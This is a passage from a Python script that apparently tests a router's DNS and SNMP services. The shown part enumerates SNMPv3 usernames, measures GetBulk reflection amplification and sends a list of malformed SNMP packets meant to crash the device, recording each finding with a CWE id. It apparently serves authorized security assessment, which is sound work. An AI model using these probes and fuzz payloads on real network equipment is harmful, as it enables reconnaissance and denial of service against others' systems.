            user_exists = "Unknown user" not in output and "Timeout" not in output
            ec.add_test("snmp", f"SNMPv3 user: {user}",
                        f"Test SNMPv3 username '{user}' (noAuthNoPriv)",
                        f"{'Possible valid user' if user_exists else 'Not found'}: {output[:200]}",
                        {"username": user, "possibly_valid": user_exists,
                         "output": output[:300]},
                        anomaly=user_exists)
        except Exception as e:
            ec.add_test("snmp", f"SNMPv3 user: {user}",
                        f"SNMPv3 user enum", f"Error: {e}")

    check_router_alive()

    # ── Test 45-50: SNMP amplification (GetBulk) ────────────────────────
    log("  Testing SNMP GetBulk amplification...")
    for max_reps in [10, 25, 50]:
        try:
            pkt = build_snmp_getbulk("public", "[REDACTED-IP].2.1.1", max_repetitions=max_reps)
            resp = send_snmp_raw(pkt, timeout=5)

            if resp:
                amp_factor = len(resp) / len(pkt)
                ec.add_test("snmp", f"GetBulk amplification (max-rep={max_reps})",
                            f"SNMP GetBulk with max-repetitions={max_reps}",
                            f"Query: {len(pkt)}B, Response: {len(resp)}B, "
                            f"Factor: {amp_factor:.1f}x",
                            {"query_size": len(pkt), "response_size": len(resp),
                             "max_repetitions": max_reps,
                             "amplification_factor": round(amp_factor, 2)},
                            anomaly=amp_factor > 10)

                if amp_factor > 20:
                    ec.add_finding("MEDIUM", f"SNMP amplification factor {amp_factor:.0f}x",
                                   f"GetBulk with max-repetitions={max_reps} yields "
                                   f"{amp_factor:.0f}x amplification",
                                   cwe="CWE-406")
            else:
                ec.add_test("snmp", f"GetBulk amplification (max-rep={max_reps})",
                            f"GetBulk test", "No response")
        except Exception as e:
            ec.add_test("snmp", f"GetBulk amplification (max-rep={max_reps})",
                        f"GetBulk test", f"Error: {e}")

    # ── Test 51-60: Malformed SNMP packets ───────────────────────────────
    log("  Testing malformed SNMP packets...")
    malformed_snmp = [
        ("Zero-length", b""),
        ("Single byte", b"\x30"),
        ("Truncated BER", b"\x30\x82\xff\xff"),
        ("Invalid ASN.1 tag", b"\xff\x05\x00\x00\x00"),
        ("Oversized community", b"\x30\x82\x01\x00\x02\x01\x01\x04\x82\x00\xff" + b"A" * 255),
        ("Null community", b"\x30\x10\x02\x01\x01\x04\x00\xa0\x09\x02\x01\x01\x02\x01\x00\x02\x01\x00\x30\x00"),
        ("Max version number", b"\x30\x10\x02\x01\xff\x04\x06public\xa0\x03\x02\x01\x01"),
        ("Random garbage (128B)", os.urandom(128)),
        ("All 0xFF (64B)", b"\xff" * 64),
        ("BER length overflow", b"\x30\x84\xff\xff\xff\xff" + b"\x00" * 100),
    ]

    fuzz_count = 0
    for name, payload in malformed_snmp:
        try:
            resp = send_snmp_raw(payload, timeout=2)
            ec.add_test("snmp", f"Malformed SNMP: {name}",
                        f"Send malformed SNMP packet: {name}",
                        f"Response: {len(resp) if resp else 0} bytes",
                        {"packet_size": len(payload),
                         "packet_hex": payload.hex()[:200],
                         "response_size": len(resp) if resp else 0})
        except Exception as e:
            ec.add_test("snmp", f"Malformed SNMP: {name}",
                        f"Malformed SNMP test", f"Error: {e}")

        fuzz_count += 1
        if fuzz_count % 10 == 0:
            h = check_router_alive()
            if not h.get("alive"):
                ec.add_finding("CRITICAL", "SNMP crash on malformed input",
                               f"Router crashed after malformed SNMP: {name}",
                               cwe="CWE-20")
                wait_for_router()

    check_router_alive()


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"Starting DNS & SNMP attacks against {TARGET}")
    log("=" * 60)

    dns_tests()
    snmp_tests()

    # Pull router logs and save evidence
    ec.save("dns_snmp_attacks.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
